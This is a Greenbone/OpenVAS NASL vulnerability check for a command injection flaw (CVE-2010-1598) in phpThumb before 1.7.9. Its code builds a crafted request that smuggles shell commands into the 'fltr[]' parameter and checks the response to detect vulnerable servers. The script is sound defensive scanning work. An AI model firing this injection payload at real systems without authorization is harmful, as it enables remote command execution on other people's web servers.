# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:phpthumb_project:phpthumb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801233");
  script_version("2022-02-21T12:24:11+0000");
  script_tag(name:"last_modification", value:"2022-02-21 12:24:11 +0000 (Mon, 21 Feb 2022)");
  script_tag(name:"creation_date", value:"2010-11-11 07:48:04 +0100 (Thu, 11 Nov 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2010-1598");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("phpThumb < 1.7.9 Command Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_phpthumb_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpthumb/http/detected");

  script_tag(name:"summary", value:"phpThumb is prone to a command injection vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied
  input via the 'fltr[]' parameter to 'phpThumb.php', which allow attackers to inject and execute
  arbitrary shell commands via specially crafted requests.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to inject and
  execute arbitrary shell commands via specially crafted requests in the context of the web server.");

  script_tag(name:"affected", value:"phpThumb prior to version 1.7.9.");

  script_tag(name:"solution", value:"Update to version 1.7.9 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/39556");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/58040");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmds = exploit_commands();

foreach pattern (keys(cmds)) {

  cmd = cmds[pattern];

  url = dir + "/phpThumb.php?src=/home/example.com/public_html/vt.jpg&fltr[]=blur|" +
              "5%20-quality%2075%20-interlace%20line%20%22/home/example.com/public_html/vt.jpg%22%20jpeg:%22" +
              "/home/example.com/public_html/vt.jpg%22;" + cmd + ";&phpThumbDebug=9";

  if (http_vuln_check(port: port, url: url, pattern: pattern)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
